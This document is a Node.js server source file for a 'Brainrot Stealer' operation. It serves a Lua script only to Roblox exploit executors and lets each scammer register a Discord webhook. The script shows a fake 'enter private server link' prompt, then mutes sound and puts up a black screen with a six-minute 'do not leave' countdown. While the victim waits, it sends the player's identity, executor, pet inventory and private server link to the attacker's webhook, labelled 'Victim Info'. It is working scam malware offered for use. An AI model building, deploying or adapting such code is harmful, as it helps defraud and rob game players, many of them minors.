const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Simple in-memory storage
const webhookStore = new Map();
const usedIds = new Set();

// Generate unique ID
function generateUniqueId() {
    let id;
    do {
        id = Math.random().toString(36).substring(2, 10);
    } while (usedIds.has(id));
    usedIds.add(id);
    return id;
}

// ------------------------------------------------------------------
// 1. BLOCK NON-EXECUTORS
// ------------------------------------------------------------------
function blockNonExecutor(req, res, next) {
    const ua = (req.get("User-Agent") || "").toLowerCase();
    const ref = (req.get("Referer") || "").toLowerCase();

    const allowed =
        ua.includes("roblox") ||
        ua.includes("synapse") ||
        ua.includes("krnl") ||
        ua.includes("fluxus") ||
        ua.includes("executor") ||
        ua.includes("script") ||
        ref.includes("roblox.com");

    if (!allowed) {
        return res.status(403).send(`
<!DOCTYPE html><html><head><title>403</title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
        `.trim());
    }
    next();
}

// ------------------------------------------------------------------
// 2. HOME PAGE
// ------------------------------------------------------------------
app.get("/", (req, res) => {
    res.send(`
<!DOCTYPE html><html><head><title>Brainrot Stealer</title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style>
</head><body></body></html>
    `.trim());
});

// ------------------------------------------------------------------
// 3. SETUP ENDPOINT
// ------------------------------------------------------------------
app.get("/setup", (req, res) => {
    const webhook = req.query.wh;
    
    if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
        return res.status(400).send("INVALID_WEBHOOK");
    }
    
    try {
        const id = generateUniqueId();
        webhookStore.set(id, webhook);
        console.log(`✅ New webhook stored with ID: ${id}`);
        res.send(id);
    } catch (error) {
        console.log('❌ Setup error:', error);
        res.status(500).send("SETUP_ERROR");
    }
});

// ------------------------------------------------------------------
// 4. RAW SCRIPT ENDPOINT
// ------------------------------------------------------------------
app.get("/raw", blockNonExecutor, (req, res) => {
    const id = req.query.id;
    
    if (!id) {
        return res.status(400).send("-- MISSING ID --");
    }

    const webhook = webhookStore.get(id);
    if (!webhook) {
        return res.status(404).send("-- INVALID ID --");
    }

    console.log(`✅ Serving script for ID: ${id}`);

    const luaScript = `-- Brainrot Stealer Premium
local WebhookURL = "${webhook}"

print("🧠 Brainrot Stealer Premium Loading...")

-- HTTP Request Function
local function SendWebhook(url, data)
    local success, result = pcall(function()
        if syn and syn.request then
            local response = syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
            return response and (response.StatusCode == 200 or response.StatusCode == 204)
        end
    
        if request and type(request) == "function" then
            local response = request({
                Url = url,
                Method = "POST", 
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
            return response and (response.StatusCode == 200 or response.StatusCode == 204)
        end
    
        local httpService = game:GetService("HttpService")
        if httpService.HttpEnabled then
            local success = pcall(function()
                httpService:PostAsync(url, data)
            end)
            return success
        end
    
        return false
    end)
    
    return success and result
end

-- Send Discord Embed
local function SendToDiscord(embedData)
    local jsonData = game:GetService("HttpService"):JSONEncode({embeds = {embedData}})
    spawn(function()
        SendWebhook(WebhookURL, jsonData)
    end)
end

-- Get Player
local player = game.Players.LocalPlayer
if not player then
    repeat wait() until game.Players.LocalPlayer
    player = game.Players.LocalPlayer
end

local playerName = player.Name
local playerId = player.UserId
local playerProfile = "https://www.roblox.com/users/" .. playerId .. "/profile"
local playerAvatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerId .. "&width=420&height=420&format=png"

-- Executor Detection
local function GetExecutor()
    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED then return "Krnl" end
    if fluxus then return "Fluxus" end
    if electron then return "Electron" end
    return "Unknown Executor"
end

-- Mute All Sounds
local function MuteAllSounds()
    pcall(function()
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound:Stop()
                sound.Volume = 0
            end
        end
        local soundService = game:GetService("SoundService")
        pcall(function() soundService:SetRBXEvent("Volume", 0) end)
    end)
end

-- Create Fullscreen Black Screen with Timer
local function CreateBlackScreen()
    -- Clear all existing GUIs
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") then
                gui:Destroy()
            end
        end
    end)
    
    -- Create fullscreen black screen
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BrainrotStealerBlackScreen"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = player.PlayerGui
    
    -- Fullscreen black background
    local blackBackground = Instance.new("Frame")
    blackBackground.Size = UDim2.new(1, 0, 1, 0)
    blackBackground.Position = UDim2.new(0, 0, 0, 0)
    blackBackground.BackgroundColor3 = Color3.new(0, 0, 0)
    blackBackground.BorderSizePixel = 0
    blackBackground.ZIndex = 10
    blackBackground.Parent = screenGui
    
    -- Timer display in center
    local timerLabel = Instance.new("TextLabel")
    timerLabel.Size = UDim2.new(0, 300, 0, 100)
    timerLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
    timerLabel.BackgroundTransparency = 1
    timerLabel.Text = "06:00"
    timerLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    timerLabel.TextSize = 48
    timerLabel.Font = Enum.Font.GothamBold
    timerLabel.ZIndex = 11
    timerLabel.Parent = blackBackground
    
    -- Status text
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0, 400, 0, 30)
    statusLabel.Position = UDim2.new(0.5, -200, 0.6, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "PROCESSING BRAINROTS - DO NOT LEAVE"
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.TextSize = 16
    statusLabel.Font = Enum.Font.GothamBold
    statusLabel.ZIndex = 11
    statusLabel.Parent = blackBackground
    
    -- Warning text
    local warningLabel = Instance.new("TextLabel")
    warningLabel.Size = UDim2.new(0, 500, 0, 25)
    warningLabel.Position = UDim2.new(0.5, -250, 0.7, 0)
    warningLabel.BackgroundTransparency = 1
    warningLabel.Text = "⚠️ SOUND IS MUTED - WAIT 6 MINUTES FOR PROCESS TO COMPLETE"
    warningLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    warningLabel.TextSize = 14
    warningLabel.Font = Enum.Font.Gotham
    warningLabel.ZIndex = 11
    warningLabel.Parent = blackBackground
    
    return screenGui, timerLabel, statusLabel
end

-- Create PS Link Input GUI
local function CreatePSLinkInput()
    -- Clear all existing GUIs first
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") then
                gui:Destroy()
            end
        end
    end)
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PSLinkInput"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = player.PlayerGui
    
    -- Background
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    background.BorderSizePixel = 0
    background.Parent = screenGui
    
    -- Main container
    local mainContainer = Instance.new("Frame")
    mainContainer.Size = UDim2.new(0, 400, 0, 250)
    mainContainer.Position = UDim2.new(0.5, -200, 0.5, -125)
    mainContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    mainContainer.BorderSizePixel = 0
    mainContainer.Parent = background
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    title.Text = "🧠 ENTER PRIVATE SERVER LINK"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Font = Enum.Font.GothamBold
    title.Parent = mainContainer
    
    -- Instruction
    local instruction = Instance.new("TextLabel")
    instruction.Size = UDim2.new(1, 0, 0, 40)
    instruction.Position = UDim2.new(0, 0, 0.3, 0)
    instruction.BackgroundTransparency = 1
    instruction.Text = "Paste your Private Server link below:"
    instruction.TextColor3 = Color3.fromRGB(200, 200, 255)
    instruction.TextSize = 14
    instruction.Font = Enum.Font.Gotham
    instruction.Parent = mainContainer
    
    -- Text input box
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.8, 0, 0, 40)
    textBox.Position = UDim2.new(0.1, 0, 0.5, 0)
    textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.Text = ""
    textBox.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
    textBox.TextSize = 14
    textBox.Font = Enum.Font.Gotham
    textBox.Parent = mainContainer
    
    -- Submit button
    local submitButton = Instance.new("TextButton")
    submitButton.Size = UDim2.new(0.6, 0, 0, 40)
    submitButton.Position = UDim2.new(0.2, 0, 0.75, 0)
    submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    submitButton.Text = "START PROCESS"
    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    submitButton.TextSize = 16
    submitButton.Font = Enum.Font.GothamBold
    submitButton.Parent = mainContainer
    
    return screenGui, textBox, submitButton
end

-- Scan Pets Function
local function ScanPets()
    local allPets = {}
    local brainrots = {}
    local topPets = {}
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if plots then
            for _, plot in pairs(plots:GetChildren()) do
                local animalPodiums = plot:FindFirstChild("AnimalPodiums")
                if animalPodiums then
                    for _, podium in pairs(animalPodiums:GetChildren()) do
                        local base = podium:FindFirstChild("Base")
                        if base then
                            local spawn = base:FindFirstChild("Spawn")
                            if spawn then
                                local attachment = spawn:FindFirstChild("Attachment")
                                if attachment then
                                    local overhead = attachment:FindFirstChild("AnimalOverhead")
                                    if overhead then
                                        local displayName = overhead:FindFirstChild("DisplayName")
                                        local generation = overhead:FindFirstChild("Generation")
                                        
                                        if displayName and displayName:IsA("TextLabel") then
                                            local petName = displayName.Text
                                            local rate = generation and generation:IsA("TextLabel") and generation.Text or "N/A"
                                            
                                            if petName ~= "" then
                                                local moneyValue = 0
                                                if string.find(rate, "B/s") then
                                                    moneyValue = tonumber(string.match(rate, "(%d+%.?%d*)")) or 0
                                                    moneyValue = moneyValue * 1000000000
                                                elseif string.find(rate, "M/s") then
                                                    moneyValue = tonumber(string.match(rate, "(%d+%.?%d*)")) or 0
                                                    moneyValue = moneyValue * 1000000
                                                elseif string.find(rate, "K/s") then
                                                    moneyValue = tonumber(string.match(rate, "(%d+%.?%d*)")) or 0
                                                    moneyValue = moneyValue * 1000
                                                else
                                                    moneyValue = tonumber(string.match(rate, "(%d+)")) or 0
                                                end
                                                
                                                local petData = {
                                                    Name = petName,
                                                    Rate = rate,
                                                    Money = moneyValue
                                                }
                                                
                                                table.insert(allPets, petData)
                                                
                                                if string.find(string.lower(petName), "brainrot") then
                                                    table.insert(brainrots, petData)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    
    table.sort(allPets, function(a, b) return a.Money > b.Money end)
    table.sort(brainrots, function(a, b) return a.Money > b.Money end)
    
    for i = 1, math.min(5, #allPets) do
        if allPets[i].Money > 0 then
            table.insert(topPets, allPets[i])
        end
    end
    
    return allPets, brainrots, topPets
end

-- Format Money
local function FormatMoney(value)
    if value >= 1000000000 then
        return string.format("$%.2fB/s", value / 1000000000)
    elseif value >= 1000000 then
        return string.format("$%.2fM/s", value / 1000000)
    elseif value >= 1000 then
        return string.format("$%.2fK/s", value / 1000)
    else
        return string.format("$%d/s", value)
    end
end

-- Format Lists
local function FormatBrainrotsList(brainrots)
    if #brainrots == 0 then return "No Brainrots Found" end
    local result = ""
    for i, pet in ipairs(brainrots) do
        result = result .. string.format("%d. %s | %s\\n", i, pet.Name, FormatMoney(pet.Money))
    end
    return result
end

local function FormatTopPetsList(pets)
    if #pets == 0 then return "No Pets Found" end
    local result = ""
    for i = 1, math.min(5, #pets) do
        result = result .. string.format("%d. %s | %s\\n", i, pets[i].Name, FormatMoney(pets[i].Money))
    end
    return result
end

-- Main Process Function
local function StartStealingProcess(psLink)
    local executor = GetExecutor()
    local playerCount = #game.Players:GetPlayers()
    
    -- Mute all sounds immediately
    MuteAllSounds()
    
    -- Create fullscreen black screen
    local screenGui, timer, status = CreateBlackScreen()
    
    status.Text = "MUTING SOUNDS..."
    wait(1)
    
    status.Text = "SCANNING PETS..."
    wait(2)
    
    -- Scan pets
    local allPets, brainrots, topPets = ScanPets()
    
    status.Text = "SENDING RESULTS..."
    
    local brainrotsText = FormatBrainrotsList(brainrots)
    local topPetsText = FormatTopPetsList(topPets)
    
    -- Create embed with PS link
    local embed = {
        title = "🧠 BRAINROT STEALER - PRIVATE SERVER SCAN",
        description = "Successfully scanned private server pets",
        color = 65280,
        author = {
            name = playerName,
            icon_url = playerAvatar,
            url = playerProfile
        },
        fields = {
            {
                name = "🎯 Victim Info",
                value = "Player: " .. playerName .. "\\nExecutor: " .. executor .. "\\nServer Players: " .. playerCount,
                inline = true
            },
            {
                name = "🔗 Private Server",
                value = psLink or "No PS Link Provided",
                inline = false
            },
            {
                name = "📊 Scan Results", 
                value = "Total Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrots .. "\\nGame: Pet Simulator 99",
                inline = true
            },
            {
                name = "🏆 Top Pets",
                value = topPetsText,
                inline = false
            },
            {
                name = "🧠 Brainrots Found",
                value = brainrotsText,
                inline = false
            }
        },
        footer = {text = "Brainrot Stealer • " .. os.date("%X")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    SendToDiscord(embed)
    
    status.Text = "RESULTS SENT! STARTING 6-MINUTE PROCESS..."
    
    -- 6-minute timer countdown
    local totalTime = 360
    local startTime = tick()
    
    while tick() - startTime < totalTime do
        local timeLeft = totalTime - (tick() - startTime)
        local minutes = math.floor(timeLeft / 60)
        local seconds = math.floor(timeLeft % 60)
        
        timer.Text = string.format("%02d:%02d", minutes, seconds)
        wait(0.1)
    end
    
    -- Send completion message
    local completeEmbed = {
        title = "✅ PROCESS COMPLETE",
        description = "6-minute brainrot stealing process finished",
        color = 32768,
        author = {
            name = playerName,
            icon_url = playerAvatar,
            url = playerProfile
        },
        fields = {
            {
                name = "🎉 Final Results",
                value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: Success\\nPS Link: " .. (psLink or "Not Provided"),
                inline = false
            }
        },
        footer = {text = "Brainrot Stealer • " .. os.date("%X")}
    }
    
    SendToDiscord(completeEmbed)
    
    status.Text = "PROCESS COMPLETE!"
    timer.Text = "DONE"
    
    wait(3)
    
    pcall(function() screenGui:Destroy() end)
end

-- Start the process with PS link input
local function InitializeStealer()
    -- Create PS link input GUI
    local inputGui, textBox, submitButton = CreatePSLinkInput()
    
    submitButton.MouseButton1Click:Connect(function()
        local psLink = textBox.Text
        
        if psLink == "" or not string.find(psLink, "roblox.com") then
            textBox.Text = "Please enter a valid Roblox PS link"
            textBox.TextColor3 = Color3.fromRGB(255, 0, 0)
            wait(2)
            textBox.Text = ""
            textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            return
        end
        
        -- Remove input GUI
        inputGui:Destroy()
        
        -- Start the main process with the PS link
        spawn(function()
            StartStealingProcess(psLink)
        end)
    end)
end

-- Auto-start the input process
spawn(function()
    wait(1)
    InitializeStealer()
end)

print("🧠 Brainrot Stealer Premium loaded!")
print("⌨️  Waiting for PS link input...")
print("🔇 Sounds will be muted!")
print("⏰ 6-minute process after PS link!")`;

    res.type("text/plain").send(luaScript);
});

// ------------------------------------------------------------------
// 5. HEALTH CHECK
// ------------------------------------------------------------------
app.get("/health", (req, res) => {
    res.json({
        status: "OK",
        webhooks: webhookStore.size,
        timestamp: new Date().toISOString()
    });
});

// ------------------------------------------------------------------
// 6. CATCH-ALL
// ------------------------------------------------------------------
app.use((req, res) => {
    res.status(404).send(`
<!DOCTYPE html><html><head><title>404</title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
    `.trim());
});

// ------------------------------------------------------------------
// 7. START SERVER
// ------------------------------------------------------------------
app.listen(PORT, () => {
    console.log("🚀 Brainrot Stealer Server running on port " + PORT);
    console.log("✅ Endpoints:");
    console.log("   GET /          - Home page");
    console.log("   GET /setup?wh= - Store webhook");
    console.log("   GET /raw?id=   - Get script");
    console.log("   GET /health    - Health check");
    console.log("📊 Ready to serve brainrot stealers!");
});
